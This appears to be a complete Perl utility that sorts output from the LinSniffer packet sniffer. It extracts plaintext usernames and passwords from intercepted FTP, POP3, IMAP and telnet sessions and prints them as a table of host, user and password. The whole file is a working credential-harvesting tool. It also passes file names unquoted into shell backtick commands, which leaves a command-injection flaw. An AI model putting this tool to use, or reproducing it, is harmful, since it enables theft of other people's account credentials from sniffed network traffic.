#!/usr/bin/perl
# Sorts the output from LinSniffer 0.03 [BETA] by Mike Edulla <medulla@infosoc.com>

$| = 1;

$perl = "/usr/bin/perl";
$argc = @ARGV;
&PrintUsage if ( $argc < 1 );

# I know, getopts(), but I don't wanna use any modules here..
if ( $argc == 1 )
{
	if ( $ARGV[0] eq "-z" ) {
		&ParseIt;
	}
	else
	{
		$file = $ARGV[0];
		&NoSuchFile unless ( -f $file );

		&PrintHeader;
		
		if ( $file =~ /\.gz$/ ) {
			print `zcat $file | $perl $0 -z | sort -u`;
		}
		else {
			print `cat $file | $perl $0 -z | sort -u`;
		}
		
		&PrintFooter;
	}
}
elsif ( $argc == 2 ) 
{
	if ( $ARGV[0] eq "-z" && $ARGV[1] eq "-d" )
	{
		$dontGuess = 1;
		&ParseIt;
	}
	elsif ( $ARGV[0] eq "-d" )
	{
		$file = $ARGV[1];
		&NoSuchFile unless ( -f $file );

		&PrintHeader;
		if ( $file =~ /.gz$/ ) {
			print `zcat $file | $perl $0 -z -d | sort -u`;
		}
		else {
			print `cat $file | $perl $0 -z -d | sort -u`;
		}
		&PrintFooter;

	}
	elsif ( $ARGV[0] eq "-z" )
	{
		&ParseIt;
	}
	else { &PrintUsage; }
}
else { &PrintUsage; }		



sub PrintUsage
{
	print "Usage: $0 [-zd] inputFile\n";
	print "       -z    Read from stdin (disables uniq, sort, header/footer etc!)\n";
	print "       -d    Don't \"guess\" telnet passwords\n\n";
	exit(1);
}

sub ParseIt 
{
	while ( &ReadLine )
	{
		# Continue if its not a "start" line.
		next unless ( ($host, $port) = $line =~ m/[^\s]+\s=>\s([^\s]+)\s\[(\d+)\]/ );
		# Read in the next line
		&ReadLine;
		next if ( $line =~ m/^-{5}/ );
		if ( $port == 21 || $port == 110 ) { &DoFaP; }
			elsif ( $port == 143 ) { &DoIMAP; }
				elsif ( $port == 23 && !$dontGuess ) { &DoTelnet; }
					else { &DoOthers; }
	}
}


sub ReadLine {
	exit(1) unless ( $line = <STDIN> );
	exit(0) if ( $line eq "Exiting..." );
	
	return(1);
}

sub PrintIt
{
	print "[" . " " x (3 - length($port)) . $port . "] " . " " x (5 - length( $port<100 ? $port . " " : $port ) );
	print $host . " " . " " x (27 - length($host));
	print $user . " " . " " x (15 - length($user));
	print $pass . "\n";
}

# Handle "unknown" servies
sub DoOthers
{
	
	$data = $line;
	while ( &ReadLine && $line !~ /^-{5}/ ) {$data .= $line;}

	# Remove the nav-key stuff.
	$data =~ s/OBOB//mg; 
	$data =~ s/AHAH//mg;
	$data =~ s/AHAH//mg;
	$data =~ s/OAOA//mg;
	$data =~ s/\[A\[A//mg;		#]]
	$data =~ s/\[B\[B//mg;		#]]
	# Replace the newline chars with :
	$data =~ s/\n/:/mg;
	chop($data);

	print $port . " " . " " x (5 - length($port));
	print $host . " " . " " x (27 - length($host));
	print $data . "\n";
}


sub DoFaP
{
	# Read in the next line if its a AUTH line, exit if ReadLine failes
	
	if ( $line =~ /^AUTH/ ) {
		exit(1) unless &ReadLine;
	}

	# Set the user variable. Return if not found.
	return(0) unless ( ($user) = $line =~ /^USER\ (.+)/ );
	return(0) if ($user eq "ftp" || $user eq "anonymous" ); 
	
	# Read in another line.
	&ReadLine;

	# Get the password, return if its not found
	return(0) unless ( ($pass) = $line =~ /^PASS (.+)/ );
	
	&PrintIt;
}


# This one handle IMAPs (port 143)
sub DoIMAP
{
	return(0) unless ( ($user, $pass) = $line =~ /LOGIN ([^\s]+) ([^\s]+)/ );
	&PrintIt;
}


# This one handle the telnets (port 23)
sub DoTelnet
{
	
	my(@sep) = ( "VT100!", "VT100", "vt100!", "vt100", "VT220P!", "VT220P", "VT200!", "VT220", "vt220!", "vt220", "\$ANSI\"!", "ANSI!", "ANSI", "UNKNOWN!", "UNKNOWN", "CONSOLE!", "CONSOLE", "\$!",  "!" );

	for ( $i=0; $sep[$i]; $i++ )
	{
		if ( ($user) = $line =~ /$sep[$i](.+)/ )
		{

			exit(1) unless &ReadLine;

			# The line is one of linsniffs "separator" lines
			return(0) if ( $line =~ m/^-{5}/ );
			chop($line);

			# Right now, we just except it to be the passwd
			# but in future versions, we'll check if it looks much like
			# the login, and if it does, we'll take the next one instead.
			$pass = $line;

			&PrintIt;
		}
	}
}

sub PrintHeader
{
	print `date`;
	print `ls -l $file`;
	print "-" x 70 . "\n";
}

sub PrintFooter
{
	print "-" x 70 . "\n";
	print `date`;
	print "-" x 67 . "EOF\n";
}

sub NoSuchFile
{
	print "Error: Cannot open file \"$file\" for reading.\n\n";
	exit(1);
}


#6516A4 
##EOF##
